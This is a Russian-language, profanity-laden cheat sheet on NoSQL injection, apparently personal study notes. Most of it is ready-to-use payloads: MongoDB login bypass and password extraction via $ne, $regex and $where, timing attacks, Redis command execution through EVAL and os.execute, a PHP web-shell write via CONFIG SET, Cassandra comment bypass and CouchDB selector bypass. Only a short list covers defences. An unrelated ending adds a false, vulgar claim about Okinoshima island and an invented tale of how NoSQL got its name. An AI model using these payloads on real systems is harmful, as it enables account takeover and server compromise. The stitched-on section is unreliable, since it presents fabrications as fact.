NoSQL инъекция это когда ты можешь вмешаться в запросы которые приложение шлет в нереляционную базу данных

В отличие от классического SQL там нет единого стандарта языков запросов, каждый тип базы ебтся по своему

##### Redis,

## ДВА ТИПА NoSQL ИНЪЕКЦИЙ

### Синтаксическая инъекция

Ты ломаешь синтаксис запроса через спецсимволы. Похоже на SQL injection но синтаксис другой. 
Например вместо `or 1=1 юзаешь '||'1'=='1`

### Инъекция операторов

Ты подсовываешь служебные операторы типа `$ne, $gt, $regex, $where` которые меняют логику запроса. Это специфика NoSQL — там можно передать не просто значение а целый объект с командой

## КАК ПОНЯТЬ ЧТО ТАМ есть NoSQL ??

- в ответах будет JSON а не HTML таблички
   
- в запросах фигурируют поля без четкой структуры
   
- URL типа `/lookup?category=fizzy` а не `?id=1`
   
- в истории запросов видно что-то типа `{"username":"wiener"}`
   
- ошибки содержат слова `mongo`, `mongodb`, `$where, $ne, $regex`
   
- при добавлении спецсимволов поведение меняется но ошибки не SQL синтаксиса

## КАК ПОНЯТЬ, ЧТО УЯЗВИМОСТЬ ЕСТЬ

### Базовые фаззинг строки

Для MongoDB портосвиггер советует юзать такую куйню:  
```c

'"`{  
;$Foo}  
$Foo \xYZ

```

Вставляешь это в параметр и смотришь меняется ли ответ
Если да — возможно синтаксис ломается

### Поиск работающих символов

Пробуешь по одному символу. Например отправляешь `'` (кавычку). Если ответ меняется — она что-то сломала. Потом пробуешь экранированную версию` ' `. Если с ней всё ок — значит кавычка работает как управляющий символ и можно инжектить

### Проверка условий

Отправляешь два запроса:

`- с false условием fizzy' && 0 && 'x`
    
`- с true условием fizzy' && 1 && 'x`
    

Если поведение разное — ты влияешь на логику запроса на сервере

### Обход существующих условий

Ломаешь запрос чтобы он всегда возвращал true:  
`fizzy'||'1'=='1`

Или добавляешь нулевой символ `%00` чтобы обрезать лишние условия:  
`fizzy'%00`

## ОПЕРАТОР ИНЪЕКЦИИ

### Как передавать операторы

В JSON как вложенный объект:  
`{"username":{"$ne":"invalid"}}`

В URL параметрах:  
`username[$ne]=invalid`

Если не работает — меняй метод на `POST`, Content-Type на `application/json` и пихай JSON в тело

### Обход авторизации

Шлешь {"username":`{"$ne":"invalid"},"password":{"$ne":"invalid"}}` — база вернет первого попавшегося юзера

### Таргетинг на конкретного админа

```c
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## ИЗВЛЕЧЕНИЕ ДАННЫХ

### Через $where

Если запрос юзает `$where` типа `{"$where":"this.username == 'admin'"}`, 

можно подсадить JavaScript:

`admin' && this.password[0] == 'a' || 'a'=='b`

Это проверяет первый символ пароля. По буквам вытягиваешь весь

Через match():  
`admin' && this.password.match(/\d/) || 'a'=='b — проверяет есть ли цифра`

### Поиск названий полей

Сравниваешь поведение для существующего поля и несуществующего:

`admin' && this.username!=' (существует)  `
`admin' && [this.foo](https://this.foo/)!=' (нет)`

Если реакция разная — поле есть

### Через keys()

Если удалось внедрить $where можно юзать `Object.keys(this)[0]` чтобы вытащить имя первого поля. Потом по буквам с match()

### Через $regex

Если JavaScript не доступен можно юзать регулярки:

`{"username":"admin","password":{"$regex":"^a*"}}`

Если вернуло успех — пароль начинается с a. По символам вытягиваешь

## ТАЙМИНГ АТАКИ

Когда ошибки не видно в ответе можно использовать задержки:

`{"$where": "sleep(5000)"}`

Или замороченный вариант:  
```c

admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

```

## КАК ЗАЩИЩАТЬСЯ

> гайд от портосвиггера и OWASP

- санитайз и валидация через белый список разрешенных символов
   
- параметризованные запросы вместо склеивания строк
   
- белый список разрешенных ключей чтобы нельзя было вставить оператор
   
- кастование типов — если ждешь строку то проверяй что это строка а не объект
   
- для mongoose юзать схемы они сами кастуют
   
- не юзать $where с пользовательским вводом
   
- минимальные права для подключения к базе
   
- читать документацию по безопасности конкретной NoSQL базы
   

> опасная куйня: в $where можно выполнить произвольный JavaScript на сервере. Если найдешь такое — считай RCE в кармане

## MongoDB

MongoDB — самая популярная цель для инъекций. Работает через JSON-операторы.

#### детектим наличие уязы так :

1 - просто шлем кавычку '  И СМОТРИМ ответы
2 - вот эту фаззинг струку шлем 
```c
'"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
3 - проверка через булл
```c
GET /product?category=fizzy'+%26%26+0+%26%26+'x
GET /product?category=fizzy'+%26%26+1+%26%26+'x
```
4 - проверка через json
```json
{"username": "wiener", "password": "peter"}
→
{"username": "wiener", "password": {"$ne": "wrong"}}
```
5 - xерез квадратные скобки
`GET /login?username=wiener&password[$ne]=wrong`

---------

### Аутентификация и обхо

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

возвращает первого пользователя у которого есть логин и пароль 

```json
{"username": "admin", "password": {"$gt": ""}}
```

подходит любой пароль который не пустой 

```json
{"$or": [{"username": "admin"}, {"password": "anything"}]}
```

обход через - или 

```json
{"username": {"$in": ["admin", "root", "superadmin"]}, "password": {"$ne": ""}}
```

перебор популярных юзернеймов 

```json
{"username": {"$regex": ".*admin.*"}, "password": {"$exists": true}}
```

регулярка на admin в имени

### Извлечение данных

после того как узнаешь длину, перебирай каждый символ:


```q
administrator' && this.password[0] == 'a' || 'a'=='b
administrator' && this.password[0] == 'b' || 'a'=='b
```


```json
{"username": "admin", "password": {"$regex": "^a"}}
```

проверяет начинается ли пароль с буквы a

```json
{"username": "admin", "password": {"$regex": "^.{3}"}}
```

проверяет что длина пароля минимум 3 символа 

```json
{"$where": "this.password.length == 8"}
```

JavaScript проверка длины пароля 

```json
{"$where": "this.username.match(/admin/)"}
```

регулярка через js 

```json
{"$where": "sleep(5000)"}
```

тайминг атака 

### Поиск полей

```json
{"$where": "Object.keys(this)[0].match('^u.*')"}
```

проверяет имя первого поля начинается с u 


```json
admin' && this.email != ''
```

инъекция в строку запроса а не в json

## Redis ка

Redis работает через команды а не через json. Там другая специфика.


#### детектим наличие уязы вот так:
Redis не ломается кавычками, там нужно пробовать команды
1 - через команду `EVAL "return 1" 0`
2 -  команды CONFIG SET через параметр `CONFIG SET dir /tmp/`


### Команды через EVAL

```lua
EVAL "redis.call('SET', KEYS[1], ARGV[1])" 1 hacked 1
```

выполнение lua скрипта

```lua
EVAL "os.execute('id')" 0
```

выполнение системной команды через os.execute 

```lua
EVAL "redis.call('CONFIG', 'SET', 'dir', '/var/www/html')" 0
```

меняет директорию для сохранения 

### Инъекции в параметры

```bash
SET hacked "\n\n<?php system($_GET['cmd']);?>\n\n"
```

запись веб шелла в значение 

```bash
CONFIG SET dbfilename shell.php
```

меняет имя файла дампа 

```c
SAVE
```

сохраняет данные в файл

## Cassandra


Cassandra использует CQL похожий на SQL но со своими ограничениями



#### детектим наличие уязы

Cassandra использует CQL, похожий на SQL, но со своими ограничениями
1 - по классике можно `' OR '1'='1`
2 - через комменты `admin'/*`


### Обход авторизации

```sql
admin'/*
```

часть запроса комментируется 
```sql
*/ and password >'
```

добивает условие

Итоговый запрос:

```sql
SELECT * FROM users WHERE username='admin'/*' AND password='*/ and password >'' ALLOW FILTERING;
```

обход проверки пароля 

### Ограничения

в CQL нет union нет join нет or нет sleep нет функций для сети нет подзапросов 
из-за этого практических эксплойтов мало и автоматизировать сложно

## CouchDB

CouchDB использует селекторы в стиле JSON похожие на MongoDB.


#### детектим наличие уязы
CouchDB работает с JSON селекторами, похоже на MongoDB

1 - Добавляем фигурные скобки `.{}.` и точки в параметры. Если падает с ошибкой про JSON — возможно есть уяза
2 -  через операторы   `$gt`,  ` $ne`  `$regex`  `$or`  `$eq`
```json
{"selector": {"username": "admin", "password": {"$gt": null}}}
```




### Обход через селекторы



```json
{"selector": {"username": "admin", "password": {"$gt": ""}}}
```

любой непустой пароль

```json
{"selector": {"$or": [{"username": "admin"}, {"username": "root"}]}}
```
обход через или 

```json
{"key": {"$eq": "admin"}, "value": {"$ne": null}}
```

key-value инъекция

```json
{"selector": {"username": {"$regex": ".*"}}}
```

все пользователи

# ЛЮТАЯ ДИЧЬ

В Японии есть остров который называется Окиносима. Там живут только мужчины и бабам туда въезд заказан накуй вообще. Типа священное место.

Мужики которые там живут обязаны перед отъездом с острова выебнуть огромный каменный куй чтобы боги не обиделись. Это не шутка.

Каменные куи там разных размеров лежат как сувениры.(исторически так сложилось - реально, как знак плодородия)

Ну и ещё там сакэ жрут как не в себя.

Всё серьёзно задокументировано. Туристы могут приплыть посмотреть но только мужики.

Остров до сих пор существует.

Это не кринж это культура.

## Пролог

В 2009 году в Сан-Франциско жил-был обычный разраб по имени Йохан. Он пил пиво, кодил на PHP и страдал от того, что его реляционная база тормозила как ржавый трактор

Однажды ночью ему приснился сон

## Сон Йохана

Йохан стоит на острове Окиносима (да, том самом, с каменными хуями). Вокруг бегают голые мужики и купаются в море. Вдруг из воды выходит огромный каменный куй, открывает рот и говорит человеческим голосом:

— Йохан, ты должен собрать всех ебанутых разработчиков, которые устали от SQL. Назови встречу NoSQL. Это будет хэштег.

Йохан просыпается в холодном поту.

## Встреча

Йохан думает: "Бред какой-то. Но хули, попробую".

Он создает ивент в Meetup, пишет: "Встреча для тех, кто не хочет больше мигрировать схемы и джойнить таблицы".

Приходит 20 человек.

Все сидят в подвале, пьют пиво, рассказывают про свои базы: про Mongo, про Couch, про какие-то левые поделки.

Кто-то спрашивает: "А как назвать это движение?"

Йохан вспоминает сон про каменный хуй и говорит: — NoSQL.

Все ржут, думают что пошутил. Но название прилипает.

## Легенда о хэштеге

На следующий день Йохан пишет в Твиттер: "Сегодня была встреча NoSQL. Было круто".

Твиттер взрывается. Люди начинают спорить: NoSQL — это значит "No SQL" или "Not Only SQL"? Хуй знает, но звучит пиздато.

Через месяц хэштег улетает в топ. Про Йохана пишут в блогах. Его зовут на конференции.

А он просто хотел собрать пару друзей пивка попить.

## И тут приходят маркетологи

Приходят ребята из MongoDB и говорят: "Йохан, чувак, ты создал движение. Мы будем делать миллиарды на NoSQL. Держи футболку с логотипом".

Йохан надевает футболку, идет в бар и пьет пиво за счет индустрии, которую он создал случайно.

## Мораль

Иногда чтобы изменить мир, достаточно:

- выпить лишнего

Так NoSQL стал именем нарицательным, а Йохан до сих пор просыпается в холодном поту и не понимает, какого хера произошло.

## Эпилог

Говорят, что на острове Окиносима теперь стоит мемориальная доска: "Здесь каменный хуй явился во сне Йохану и велел создать NoSQL".

Но никто не может это проверить, потому что бабам туда нельзя, а мужики дали обет молчания.
